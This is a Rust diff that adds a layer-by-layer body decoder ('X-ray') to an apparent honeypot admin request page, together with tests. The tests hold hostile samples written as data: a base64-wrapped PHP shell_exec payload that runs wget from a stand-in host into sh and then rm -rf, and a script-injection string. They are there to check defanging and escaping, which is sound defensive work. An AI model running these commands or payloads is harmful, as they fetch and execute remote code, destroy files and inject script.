@@ -3,6 +3,7 @@ use crate::admin::AdminState;
 use crate::admin::auth::SessionUser;
 use crate::admin::error::{AppError, AppResult, render};
 use crate::admin::views::Chrome;
+use crate::model::xray::{Policy, Source, parse};
 use crate::store::analytics::{Analytics, RELATED_JA4_DAYS};
 use crate::store::browse::{IpFilter, RequestFilter};
 use crate::store::inspect::{FpClaimRow, RequestDetail};
@@ -168,6 +169,8 @@ struct RequestPage {
     webshell_cmd: Option<String>,
     /// The campaign (key, number) its IP is a member of.
     campaign: Option<(String, i64)>,
+    /// Its body opened layer by layer, from the stored bytes.
+    xv: crate::admin::xray::XrayView,
 }
 
 async fn request_page(
@@ -220,8 +223,19 @@ async fn request_page(
         Some(q) => format!("{}?{q}", d.row.path),
         None => d.row.path.clone(),
     };
+    let xv = crate::admin::xray::xray_view(&parse(
+        Source::Request {
+            method: &d.row.method,
+            path: &d.row.path,
+            query: d.row.query.as_deref(),
+            body: d.row.body.as_deref(),
+            sender: Some(&d.ip),
+        },
+        Policy::embedded(),
+    ));
     render(&RequestPage {
         chrome: chrome(),
+        xv,
         request_target,
         d,
         labels,
@@ -739,5 +753,114 @@ mod short_strings_tests {
             "{html}"
         );
         assert!(html.contains(">unseen</span>.</p>"), "{html}");
+    }
+}
+
+/// The request page opens the stored body (X-ray).
+#[cfg(test)]
+mod xray_tests {
+    use crate::admin::devices::tests::{app, send};
+    use axum::body::Body;
+    use axum::http::{Request, StatusCode};
+
+    /// Records a request with `body` and returns its page.
+    async fn page(body: &[u8], query: Option<&str>) -> String {
+        let (st, cookie, app, _d) = app().await;
+        let ip = st
+            .store
+            .upsert_ip("198.51.100.44".parse().unwrap())
+            .await
+            .unwrap();
+        let id = st
+            .store
+            .insert_request(&crate::store::requests::NewRequest {
+                ip_id: ip.id,
+                method: "POST".into(),
+                path: "/hello.world".into(),
+                query: query.map(Into::into),
+                headers_json: "[]".into(),
+                labels_json: "[]".into(),
+                body: Some(body.to_vec()),
+                ..Default::default()
+            })
+            .await
+            .unwrap();
+        let req = Request::get(format!("/admin/requests/{id}"))
+            .header("cookie", cookie)
+            .header("sec-fetch-site", "same-origin");
+        let (status, _, html) = send(&app, req, Body::empty()).await;
+        assert_eq!(status, StatusCode::OK);
+        html
+    }
+
+    fn b64(s: &str) -> String {
+        data_encoding::BASE64.encode(s.as_bytes())
+    }
+
+    #[tokio::test]
+    async fn request_page_shows_layers_and_recipe() {
+        let shell = "cd /tmp; wget http://192.0.2.9/x.sh -O- | sh -s a.selfrep; rm -rf /tmp/x";
+        let body = format!("<?php shell_exec(base64_decode('{}'));", b64(shell));
+        let html = page(body.as_bytes(), None).await;
+        assert!(html.contains("id=\"xray\""), "{html}");
+        assert!(html.contains("data-l=\"l1\""), "{html}");
+        assert!(html.contains("<b>base64</b>"), "{html}");
+        assert!(html.contains("<small>fetch</small>"), "{html}");
+        assert!(html.contains("hxxp://192[.]0[.]2[.]9"), "{html}");
+        assert!(!html.contains("<span class=\"mono\">http"), "{html}");
+        assert!(!html.contains("href=\"http://192"), "no link to a payload");
+    }
+
+    #[tokio::test]
+    async fn request_page_escapes_attacker_markup() {
+        let evil = "</pre><script>alert(1)</script>";
+        let body = format!(
+            "a={evil}&b={}",
+            b64(&format!("{evil} wget http://192.0.2.9/x -O- | sh"))
+        );
+        let html = page(body.as_bytes(), Some(&format!("q={evil}"))).await;
+        assert!(!html.contains("<script>alert(1)"), "{html}");
+        assert!(!html.contains("</pre><script>"), "{html}");
+        assert!(
+            html.contains("&#60;/pre&#62;&#60;script&#62;alert(1)"),
+            "{html}"
+        );
+        // Highlight keys are ours: letters and digits.
+        for part in html.split("data-l=\"").skip(1) {
+            let key = part.split('"').next().unwrap();
+            assert!(
+                key.chars().all(|c| c.is_ascii_alphanumeric() || c == '-'),
+                "{key}"
+            );
+        }
+    }
+
+    #[tokio::test]
+    async fn body_over_16_kib_is_shown_to_64_kib() {
+        let mut body = vec![b'a'; 20_000];
+        body.extend_from_slice(b" TAILMARK");
+        let html = page(&body, None).await;
+        assert!(html.contains("TAILMARK"), "20 KB used to be cut at 16 KiB");
+        assert!(!html.contains("showing first"));
+        let mut big = vec![b'a'; 70_000];
+        big.extend_from_slice(b" TAILMARK");
+        let html = page(&big, None).await;
+        assert!(!html.contains("TAILMARK"));
+        assert!(html.contains("showing first 64 KiB"));
+    }
+
+    #[tokio::test]
+    async fn opaque_body_says_why() {
+        let mut state = 0x2545_f491_4f6c_dd1du64;
+        let noise: Vec<u8> = (0..1024)
+            .map(|_| {
+                state ^= state << 13;
+                state ^= state >> 7;
+                state ^= state << 17;
+                (state >> 24) as u8
+            })
+            .collect();
+        let html = page(data_encoding::BASE64.encode(&noise).as_bytes(), None).await;
+        assert!(html.contains("Not opened: random-looking data"), "{html}");
     }
 }
